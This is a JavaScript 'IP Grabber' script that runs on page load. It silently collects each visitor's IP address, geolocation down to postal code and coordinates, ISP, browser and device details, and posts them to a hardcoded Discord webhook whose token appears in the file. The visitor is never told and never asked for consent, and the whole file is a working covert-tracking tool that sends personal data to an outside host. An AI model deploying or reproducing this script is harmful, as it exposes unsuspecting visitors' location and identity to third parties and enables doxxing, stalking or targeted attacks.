// Discord Webhook URL - Replace with your actual webhook URL
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1416742887722320062/-5WaLqKF3w21CGDp_q24eKtV8KXdP5e2_6ES2GAB8nyacoq_pn_cSj8kh98KXer1owjf';

// Function to get user's IP and device information
async function grabUserInfo() {
    try {
        // Get IP information from multiple sources for reliability
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        // Get detailed location and ISP info
        const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const detailsData = await detailsResponse.json();
        
        // Get browser and device information
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const cookieEnabled = navigator.cookieEnabled;
        const javaEnabled = navigator.javaEnabled();
        
        // Get screen information
        const screenWidth = screen.width;
        const screenHeight = screen.height;
        const screenColorDepth = screen.colorDepth;
        
        // Get timezone
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        // Get current timestamp
        const timestamp = new Date().toISOString();
        
        // Compile all information
        const userInfo = {
            ip: ipData.ip,
            city: detailsData.city || 'Unknown',
            region: detailsData.region || 'Unknown',
            country: detailsData.country_name || 'Unknown',
            countryCode: detailsData.country_code || 'Unknown',
            isp: detailsData.org || 'Unknown',
            latitude: detailsData.latitude || 'Unknown',
            longitude: detailsData.longitude || 'Unknown',
            postal: detailsData.postal || 'Unknown',
            userAgent: userAgent,
            platform: platform,
            language: language,
            cookieEnabled: cookieEnabled,
            javaEnabled: javaEnabled,
            screenWidth: screenWidth,
            screenHeight: screenHeight,
            screenColorDepth: screenColorDepth,
            timezone: timezone,
            timestamp: timestamp,
            referrer: document.referrer || 'Direct visit'
        };
        
        // Send to Discord webhook
        await sendToDiscord(userInfo);
        
        return userInfo;
    } catch (error) {
        console.error('Error grabbing user info:', error);
        // Send error notification to Discord
        await sendErrorToDiscord(error);
    }
}

// Function to send user info to Discord webhook
async function sendToDiscord(userInfo) {
    if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
        console.log('Please replace DISCORD_WEBHOOK with your actual webhook URL');
        console.log('User info that would be sent:', userInfo);
        return;
    }
    
    const embed = {
        title: "New Visitor Detected",
        color: 0xFF0000, // Red color
        timestamp: userInfo.timestamp,
        fields: [
            {
                name: "Network Information",
                value: `**IP Address:** ${userInfo.ip}\n**ISP:** ${userInfo.isp}`,
                inline: false
            },
            {
                name: "Location",
                value: `**Country:** ${userInfo.country} (${userInfo.countryCode})\n**Region:** ${userInfo.region}\n**City:** ${userInfo.city}\n**Postal:** ${userInfo.postal}\n**Coordinates:** ${userInfo.latitude}, ${userInfo.longitude}`,
                inline: false
            },
            {
                name: "Device Information",
                value: `**Platform:** ${userInfo.platform}\n**Screen:** ${userInfo.screenWidth}x${userInfo.screenHeight} (${userInfo.screenColorDepth}-bit)\n**Language:** ${userInfo.language}\n**Timezone:** ${userInfo.timezone}`,
                inline: false
            },
            {
                name: "Browser Information",
                value: `**User Agent:** ${userInfo.userAgent}\n**Cookies:** ${userInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n**Java:** ${userInfo.javaEnabled ? 'Enabled' : 'Disabled'}\n**Referrer:** ${userInfo.referrer}`,
                inline: false
            }
        ],
        footer: {
            text: "IP Grabber • Visitor Tracking System"
        }
    };
    
    const payload = {
        embeds: [embed]
    };
    
    try {
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
            throw new Error(`Discord webhook failed: ${response.status}`);
        }
        
        console.log('Successfully sent user info to Discord');
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

// Function to send error notifications to Discord
async function sendErrorToDiscord(error) {
    if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
        return;
    }
    
    const embed = {
        title: "⚠️ Error in IP Grabber",
        color: 0xFFFF00, // Yellow color
        description: `An error occurred while trying to grab user information:\n\`\`\`${error.message}\`\`\``,
        timestamp: new Date().toISOString(),
        footer: {
            text: "IP Grabber Error Log"
        }
    };
    
    const payload = {
        embeds: [embed]
    };
    
    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    } catch (webhookError) {
        console.error('Error sending error to Discord:', webhookError);
    }
}

// Automatically grab user info when the page loads
document.addEventListener('DOMContentLoaded', function() {
    console.log('IP Grabber loaded successfully');
    
    // Add a small delay to ensure the page is fully loaded
    setTimeout(() => {
        grabUserInfo();
    }, 1000);
});

// Optional: Add a manual trigger button (you can remove this if not needed)
function addManualTrigger() {
    const button = document.createElement('button');
    button.textContent = 'Refresh Info';
    button.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        padding: 10px 15px;
        background: #333;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        z-index: 9999;
    `;
    button.onclick = grabUserInfo;
    document.body.appendChild(button);
}

// Uncomment the line below if you want a manual refresh button
// addManualTrigger();
